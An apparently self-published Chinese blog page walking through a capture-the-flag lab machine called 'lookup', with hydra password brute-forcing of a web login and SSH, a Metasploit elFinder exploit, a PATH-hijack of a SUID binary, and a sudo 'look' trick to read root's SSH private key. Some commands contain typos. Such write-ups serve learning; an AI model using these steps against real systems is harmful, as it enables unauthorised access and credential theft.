@@ -1,0 +1,314 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>lookup 教程 | Asuna</title><meta name="author" content="Asuna"><meta name="copyright" content="Asuna"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="lookup 教程 这次来了个lookup 话不多说 直接看题  第一步我们还是绑一下域名 就是在&#x2F;etc&#x2F;hosts里面输你的机器ip 加lookup.thm 这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去  第二步我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lookup 教程">
+<meta property="og:url" content="https://oasko.github.io/2025/01/31/lookup-%E6%95%99%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Asuna">
+<meta property="og:description" content="lookup 教程 这次来了个lookup 话不多说 直接看题  第一步我们还是绑一下域名 就是在&#x2F;etc&#x2F;hosts里面输你的机器ip 加lookup.thm 这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去  第二步我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg">
+<meta property="article:published_time" content="2025-01-31T11:07:31.000Z">
+<meta property="article:modified_time" content="2025-02-01T10:47:05.834Z">
+<meta property="article:author" content="Asuna">
+<meta property="article:tag" content="linux 渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "lookup 教程",
+  "url": "https://oasko.github.io/2025/01/31/lookup-%E6%95%99%E7%A8%8B/",
+  "image": "https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg",
+  "datePublished": "2025-01-31T11:07:31.000Z",
+  "dateModified": "2025-02-01T10:47:05.834Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Asuna",
+      "url": "https://oasko.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://oasko.github.io/2025/01/31/lookup-%E6%95%99%E7%A8%8B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'lookup 教程',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="css/touming.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://s2.loli.net/2024/12/28/fdpLbCNQwExoPan.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> tag</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 图书</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/chat/"><i class="fa-fw fa fa-lightbulb-o"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Asuna</span></a><a class="nav-page-title" href="/"><span class="site-name">lookup 教程</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> tag</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 图书</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/chat/"><i class="fa-fw fa fa-lightbulb-o"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">lookup 教程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-31T11:07:31.000Z" title="发表于 2025-01-31 19:07:31">2025-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-01T10:47:05.834Z" title="更新于 2025-02-01 18:47:05">2025-02-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="lookup-教程"><a href="#lookup-教程" class="headerlink" title="lookup 教程"></a>lookup 教程</h1><p><img src="/images/lookup-%E6%95%99%E7%A8%8B/head.png" alt="lookup"></p>
+<p>这次来了个lookup 话不多说 直接看题</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/title.png" alt="lookup"></p>
+<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>我们还是绑一下域名 就是在&#x2F;etc&#x2F;hosts里面输你的机器ip 加lookup.thm</p>
+<p>这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/fail.png" alt="file"></p>
+<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密码错误 第二个是密码和账户都错误 用hydra来搞一下 看看能破解出来吗 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form  &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong Password. Please try again&quot;</span><br><span class="line"></span><br><span class="line">hydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form  -vV &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username or password. Please try again.&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过第一个代码 能够爆出密码是晒 第二个代码可以把账户名也搞出来</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/password.png" alt="hydra"></p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/password2.png" alt="hydra"></p>
+<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>破解出密码之后 我们登录进去看看怎么个事 发现是个类似文件夹的管理系统 文件基本上都是上锁了 看看没解锁的文件有啥提示吗 </p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/file1.png" alt="lock"></p>
+<p>好吧 也没提示啥 偶然发现了这个文件夹是elfinder 版本号也知道 搜一下看有漏洞吗 发现是有的 我们打开msf 搜一下这个漏洞</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/banbaen.png" alt="lock"></p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/msf.png" alt="msf"></p>
+<p>配置一下rhost和lhost这两个参数 一个是你要攻击的域名 一个是你本机的ip run一下 我们成功打进去了</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/msf1.png" alt="msf"></p>
+<h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>这个有有点困难了 要提权 先find &#x2F;–perm 4000 2&gt;&#x2F;dev&#x2F;null 查看suid用户 发现一个叫pwn的用户 感觉这个是解题关键 ls查看一下详细信息 所属root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /--perm 4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/pwn.png" alt="shell"></p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/pwn2.png" alt="shell"></p>
+<p>输入&#x2F;usr&#x2F;sbin&#x2F;pwm 他告诉我们提示 输入ip 会显示用户名 我们就得想办法的让他爆名字 输入id这个命令能知道用户名</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/id.png" alt="shell"></p>
+<p>我们在&#x2F;tmp中搞一个id的文本文件 id think用户 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n echo &quot;uid=33(think) gid=33(think) groups=33(think)&quot;&#x27; &gt; id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/think.png" alt="shell"></p>
+<p>别忘了给这个id文件加上可执行的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x id</span><br></pre></td></tr></table></figure>
+<p>然后修改一下环境变量 将 &#x2F;tmp 目录添加到 PATH 变量的最前面。系统在查找可执行文件时，会首先查找 &#x2F;tmp 目录中的文件。</p>
+<p>如果 &#x2F;tmp 目录中有可执行文件，直接输入命令时，系统会优先在 &#x2F;tmp 中寻找该命令。</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/export.png" alt="shell"></p>
+<p>重新运行&#x2F;usr&#x2F;sbin&#x2F;pwm 就能看到爆出来了一堆密码(没猜错就是密码)</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/jose1.png" alt="shell"></p>
+<p>把这些复制下来 粘贴到一个文本文档中 做成一个密码本 用户名为think 用hydra爆破ssh的密码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l think -P /path/你的密码本文件名 ssh://lookup.thm</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/mima.png" alt="shell"></p>
+<p>用这个用户名和密码就能成功ssh连接上think这个用户 然后直接ls就能查看到user.txt</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/user.png" alt="mima"></p>
+<p>成功爆破 还有一个root用户还没解决 我们sudo -l查看能运行什么命令 有个look 我们到这里<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> 搜索look </p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/sudo.png" alt="mima"></p>
+<p>这也是个漏洞 让他爆出root的秘钥</p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/look2.png" alt="mima"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LFILE = /root/.ssh/id_rsa </span><br><span class="line"></span><br><span class="line">sudo look &#x27;&#x27;  “ $LFILE ”</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/look.png" alt="mima"></p>
+<p>最后把 秘钥粘贴到一个文本文件中  成功登录 ls就能看到root.txt 第二问解决</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i 文件名 root@lookup.thm</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/ssh.png" alt="mima"></p>
+<p><img src="/images/lookup-%E6%95%99%E7%A8%8B/root.png" alt="mima"></p>
+<p>lookup只能说很细节 用了msf hydra 提权 提权还是不懂 我都是网站找的python的搞 这个纯纯弱项了 还有hydra也折腾了好久 本来是rockyou.txt一直梭 但一直不出 换了好几个用户名的字典 才把用户名搞出来<br>要破解网站要加这个”username&#x3D;^USER^&amp;password&#x3D;^PASS^:网页输错的提示”一开始是很不理解为啥这样的 这个网站一个是密码和用户名全错 一个是用户名错 就用这个提示把密码筛选出来 然后用密码破用户名 学的东西还挺多的</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://oasko.github.io">Asuna</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://oasko.github.io/2025/01/31/lookup-%E6%95%99%E7%A8%8B/">https://oasko.github.io/2025/01/31/lookup-%E6%95%99%E7%A8%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://oasko.github.io" target="_blank">Asuna</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/linux-%E6%B8%97%E9%80%8F/">linux 渗透</a></div><div class="post-share"><div class="social-share" data-image="https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/25/Bricks-Heist-%E6%95%99%E7%A8%8B/" title="Bricks Heist 教程"><img class="cover" src="https://s2.loli.net/2025/02/01/9PhqARN1ybnjfkJ.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-25</div><div class="info-item-2">Bricks Heist 教程</div></div><div class="info-2"><div class="info-item-1">祝师傅们2025越来越好 技术越来越牛Bricks Heist教程我们看一下Bricks Heist 这个简单挑战 这个是题目  我们先把自己的机子ip和bricks.thm绑到&#x2F;etc&#x2F;hosts里面  连接上openvpn之后咱正式开搞 第一步先nmap开扫 可以看到他们开放了22，80和443端口   第二步我们在浏览器那搜索ip地址和域名 看一下有什么结果吗 直接输ip的话是啥也没有  我们换成域名试一试 发现成功了  第三步我们把这个拉到wpscan里面扫描一下 1wpscan --url https://bricks.thm/ --disable-ssl-checks  为什么要加–disable-ssl-checks这个参数捏 不加的话他会报错 说目标网站的 SSL&#x2F;TLS 证书不正确或无法验证  –disable-ssl-checks 参数可以让你在面对无效证书（如自签名证书、过期证书等）时继续进行扫描，跳过 SSL&#x2F;TLS 证书验证检查。 扫描结果我们可以发现在robots.txt中有两个可疑的路径  第二个呢...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://s2.loli.net/2025/01/19/47KGSaY3sudRFjV.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Asuna</div><div class="author-info-description">Do not go gentle into that good night</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">祝你青葱加鱼块 烧油又紫菜</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lookup-%E6%95%99%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">lookup 教程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">1.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">1.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">1.3.</span> <span class="toc-text">第三步</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="toc-number">1.4.</span> <span class="toc-text">第四步</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/31/lookup-%E6%95%99%E7%A8%8B/" title="lookup 教程"><img src="https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="lookup 教程"/></a><div class="content"><a class="title" href="/2025/01/31/lookup-%E6%95%99%E7%A8%8B/" title="lookup 教程">lookup 教程</a><time datetime="2025-01-31T11:07:31.000Z" title="发表于 2025-01-31 19:07:31">2025-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/31/network-%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5/" title="network 网络概念">network 网络概念</a><time datetime="2025-01-31T10:20:52.000Z" title="发表于 2025-01-31 18:20:52">2025-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/31/pyrat-%E6%95%99%E7%A8%8B/" title="pyrat  教程">pyrat  教程</a><time datetime="2025-01-31T07:56:01.000Z" title="发表于 2025-01-31 15:56:01">2025-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/25/Bricks-Heist-%E6%95%99%E7%A8%8B/" title="Bricks Heist 教程"><img src="https://s2.loli.net/2025/02/01/9PhqARN1ybnjfkJ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bricks Heist 教程"/></a><div class="content"><a class="title" href="/2025/01/25/Bricks-Heist-%E6%95%99%E7%A8%8B/" title="Bricks Heist 教程">Bricks Heist 教程</a><time datetime="2025-01-25T14:12:02.000Z" title="发表于 2025-01-25 22:12:02">2025-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集"><img src="https://s2.loli.net/2025/02/01/wmdJujK4AO2iMYb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息收集"/></a><div class="content"><a class="title" href="/2025/01/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集">信息收集</a><time datetime="2025-01-25T01:09:17.000Z" title="发表于 2025-01-25 09:09:17">2025-01-25</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Asuna</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'oasko/Giscus-demo',
+      'data-repo-id': 'R_kgDONt6VLw',
+      'data-category-id': 'DIC_kwDONt6VL84CmPGu',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
